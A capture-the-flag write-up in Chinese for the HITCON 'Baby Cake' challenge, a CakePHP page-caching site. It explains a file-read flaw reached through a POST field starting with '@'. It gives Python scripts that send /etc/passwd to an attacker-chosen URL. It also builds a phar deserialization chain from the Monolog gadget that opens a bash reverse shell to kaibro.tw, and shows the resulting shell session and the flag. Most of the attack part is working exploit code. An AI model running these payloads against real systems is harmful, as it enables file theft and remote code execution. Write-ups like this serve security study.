# Baby Cake

## 題目

題目是一個網站，可以輸入url

他會把該url的頁面cache起來

從source code可以看到他是用Cakephp寫的

主要邏輯都在`PagesController`

可以發現只有`get` method會去cache

然後scheme限制只能`http`, `https`

## 洞

從source code慢慢往下跟，可以發現

`httpclient(Client)` -> `$method()` -> `_doRequest()` -> `_createRequest()` -> `new Request()` -> `body()` -> `addMany()` -> `add()` -> `addFile()` -> `file_get_contents($value)`

這邊`$value`是我們可以控制的，他來源是`getQuery('data')`

只需要滿足`(is_string($value) && strlen($value) && $value[0] === '@')`即可走到`file_get_contents()`

所以利用方式就是

POST `data[]="@filename"`，這個filename就會丟進`file_get_contents`

並且他會用`fopen`將此檔案內容送到我們指定的`url`

所以一個簡單的任意讀檔exploit如下:

```
import requests
s = requests.session()
s.post('http://13.230.134.135/', params={'url': 'http://yourip:yourport', 'data[]': '@/etc/passwd'})
```

可是這題要RCE，單純只讀檔很難RCE

後來比賽結束前才想到，`file_get_contents()`可以塞php wrapper，而body.cache又可以當作上傳檔案

那不就可以用經典的`phar://`去unserailize!

接著只需要構造pop chain即可

可以從phpggc看到

```
Monolog/RCE1          1.18 <= 1.23      rce              __destruct
```

而從`composer.json`也可以看到`"monolog/monolog": "^1.23"`，版本剛好在範圍內!

所以就直接構造payload:

```php
<?php

namespace GadgetChain\Monolog;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '1.18 <= 1.23';
    public $vector = '__destruct';
    public $author = 'cf';

    public function generate(array $parameters)
    {
        $code = "bash -c 'bash -i >& /dev/tcp/kaibro.tw/10001 0>&1'";

        @unlink('exp.phar');
        $p = new \Phar('exp.phar');
        $p->startBuffering();
        $p->setStub("<?php __HALT_COMPILER();?>");
        $p->addFromString("test.txt", "test");
        $p->setMetadata(new \Monolog\Handler\SyslogUdpHandler(new \Monolog\Handler\BufferHandler(['current', 'system'],[$code, 'level' => null])));
        $p->stopBuffering();

    }
}

```

跑完會生成`exp.phar`

上傳到自己Server: kaibro.tw/exp.phar


exp.py:

```python
import requests                                                                                                        
import sys
import hashlib

m = hashlib.md5()
ip = '1.2.3.4'

r = requests.get('http://13.230.134.135/?url='+sys.argv[1])

s = requests.session()
m.update(sys.argv[1])
pay = "phar:///var/www/html/tmp/cache/mycache/"+ip+"/"+m.hexdigest()+"/body.cache"
print pay
print(s.post('http://13.230.134.135/', params={'url': 'http://kaibro.tw:6666/', 'data[]': '@'+pay}))

```

接著跑`python exp.py http://kaibro.tw/exp.phar`即可reverse shell

```
Ncat: Version 7.01 ( https://nmap.org/ncat )
Ncat: Listening on :::10001
Ncat: Listening on 0.0.0.0:10001
Ncat: Connection from 13.230.134.135.
Ncat: Connection from 13.230.134.135:39072.
bash: cannot set terminal process group (7953): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-172-31-24-186:/$ ls -a
ls -a
.
..
bin
boot
dev
etc
flag
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
read_flag
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
www
```

`hitcon{smart_implementation_of_CURLOPT_SAFE_UPLOAD><}`
